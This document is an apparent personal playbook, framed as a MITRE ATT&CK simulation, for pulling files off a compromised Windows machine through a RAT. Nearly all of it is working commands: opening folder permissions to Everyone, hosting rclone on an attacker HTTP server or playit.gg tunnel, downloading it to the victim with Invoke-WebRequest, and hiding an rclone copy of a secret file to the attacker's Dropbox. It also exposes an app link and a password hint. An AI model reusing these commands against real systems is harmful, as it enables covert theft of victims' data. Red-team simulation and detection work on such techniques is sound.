## MITRE ATT\&CK Exfiltration Simulation via dropbox using **rclone**

I followed **https://www.dropbox.com/developers/apps/info/s3jnq4f8fcstvgw** this link, to get the client id and client secret, then I use it later while setting rclone. Here are the following steps to do exfiltration:

### 0. Give Write Access To a Folder
To give a folder **write access**, especially from a script or RAT shell (with limited UI or feedback), you can use PowerShell or `icacls` commands to set permissions. Here's how:

---

## Method: Use `icacls` to Grant Write Access

```cmd
icacls "C:\Your\Target\Folder" /grant Everyone:(OI)(CI)M
```

### Breakdown:

* `Everyone`: Grants access to all users (you can replace with a specific user if needed).
* `(OI)(CI)`: Applies to **files and subfolders** (Object Inherit + Container Inherit).
* `M`: Stands for **Modify**, which includes read/write permissions.

---

## Example:

To make `C:\PublicRAT` writeable:

```cmd
mkdir C:\PublicRAT
icacls "C:\PublicRAT" /grant Everyone:(OI)(CI)M
```

Now your RAT shell should be able to **write files there**, e.g.:

```cmd
cmd.exe /c echo Hello > C:\PublicRAT\test.txt
```

### 1. **Prepare on Attacker Machine**

* Download `rclone` from: [https://rclone.org/downloads/](https://rclone.org/downloads/)
* Extract it somewhere like:
  `E:\Hacking\rclone-v1.69.2-windows-amd64\`

---

### 2. **Configure `rclone` with dropbox**

In your **attacker machine's terminal**, run:

```bash
rclone config
```

Follow these steps:

1. Type `n` for a new remote.
2. Name it something like: `dropboxStorage`
3. Choose storage type: `drive` (13 for dropbox)
4. Follow the prompts to authenticate via browser.
5. At the end, type `y` to confirm, then `q` to quit.
6. Then in this linke, `https://www.dropbox.com/developers/apps/info/s3jnq4f8fcstvgw#permissions`, give all `write & read` access in `Files and folders` and `Collaboration`.

This process generates the config file. Then try this command to find the actual location:

```bash
rclone config file
```

It will output something like:

```
Configuration file is stored at: C:\Users\Niloy\.config\rclone\rclone.conf
```

That’s the file you need to send to the victim. Once you find it, copy it to the folder where `rclone.exe` is located (on attacker machine) so you can send both files to the victim:


Then transfer both:

* `rclone.exe`
* `rclone.conf`

to the victim’s machine via the RAT.

---

### 3. **Host Files for Victim to Pull**

To simulate real-world behavior and avoid direct upload via RAT:

1. Copy `rclone.exe` and `rclone.conf` to a web-accessible server or local HTTP server:

   * E.g., start a server:

     ```bash
     python -m http.server 8000
     ```

     In directory where `rclone.exe` and `rclone.conf` are located.

---

### 4. **Use RAT (PowerShell Shell) to Download Files on Victim**

Go through **File Manager** to the expected folder and upload the **reclone.conf**, as it is small in size that's why we can upload it directly via RAT. But as the **rclone.exe** is big in size, thats why we need to send it via power shall. From the attacker, send PowerShell commands via RAT. You can do the same for the **rclone.conf** also.

```powershell
Invoke-WebRequest -Uri "http://<attacker-ip>:8000/rclone.exe" -OutFile "C:\PublicRAT\rclone.exe"
Invoke-WebRequest -Uri "http://<attacker-ip>:8000/rclone.conf" -OutFile "C:\PublicRAT\rclone.conf"
```

```powershell
Invoke-WebRequest -Uri "http://192.168.113.226:8000/rclone.exe" -OutFile "C:\NewRAT\rclone.exe"
```

Now `rclone.exe` and its config are on the **victim system**.

---

### 5. **Exfiltrate File Using `rclone` Remotely**

Send via RAT: 

```powershell
Start-Process -WindowStyle Hidden -FilePath "C:\PublicRAT\rclone.exe" -ArgumentList 'copy "C:\Users\Public\Documents\newSecret.txt" dropboxStorage:/ --config "C:\PublicRAT\rclone.conf"'
```

Notes:

* `dropboxStorage` is the name you used during `rclone config`.
* You can exfiltrate any file the user has permission to read.

---

### 6. **Check dropbox**

Your file (e.g., `secret.txt`) should now appear in the root of your dropbox `https://www.dropbox.com/home?_ad=20016251&_camp=LCEPA&_tk=notification&checklist=open`. You need to wait for some minutes (1-2) to get the file there.

---

### MITRE ATT\&CK Coverage:

![alt text](flow.png)

| Tactic              | Technique                                 | Description                         |
| ------------------- | ----------------------------------------- | ----------------------------------- |
| Execution           | T1059 - Command and Scripting Interpreter | PowerShell shell via RAT            |
| Ingress Tool        | T1105 - Ingress Tool Transfer             | Download `rclone.exe` and `.conf`   |
| Exfiltration        | T1567.002 - Exfil to Cloud Storage        | Send files to dropbox          |
| Persistence/Stealth | T1027 - Obfuscated Files or Info          | Using trusted tools like PowerShell |


### Full process using port forwarding

* Start the playit.gg both from homescreen and the playit-0.9.3-signed from **E:\Hacking\Tools\PlayIt.gg**
* E.g., start the server from **E:\Hacking\rclone-v1.69.2-windows-amd64\rclone-payload** or **E:\Hacking\rclone-v1.69.2-windows-amd64\dropbox-payload** or directly **E:\Hacking\rclone-v1.69.2-windows-amd64**:
   ```bash
   python -m http.server 1335
   ```
* Then do the following:
  ```powershall
  mkdir C:\PublicRAT
  icacls "C:\PublicRAT" /grant Everyone:(OI)(CI)M
  ```
  
  Now your RAT shell should be able to **write files there**, e.g.:
  
  ```cmd
  cmd.exe /c echo Hello > C:\PublicRAT\test.txt
  ```
* If the **test.txt** successfully writes in that location, then first direct upload the latest `rclone.conf` in `C:\PublicRAT\`. Then do the following in RAT shell:

  ```powershell
  Invoke-WebRequest -Uri "http://silver-generate.gl.at.ply.gg:22366/rclone.exe" -OutFile "C:\PublicRAT\rclone.exe"
  ```
* Then transfer data using the following convention:
  ```powershell
  Start-Process -WindowStyle Hidden -FilePath "C:\PublicRAT\rclone.exe" -ArgumentList 'copy "C:\Users\Public\Documents\newSecret.txt" dropboxStorage:/ --config "C:\PublicRAT\rclone.conf"'
  ```
* Check your dropbox (in bsse mail, pass is as like your cefalo PC's password) and click recent, you will get the uploaded file.
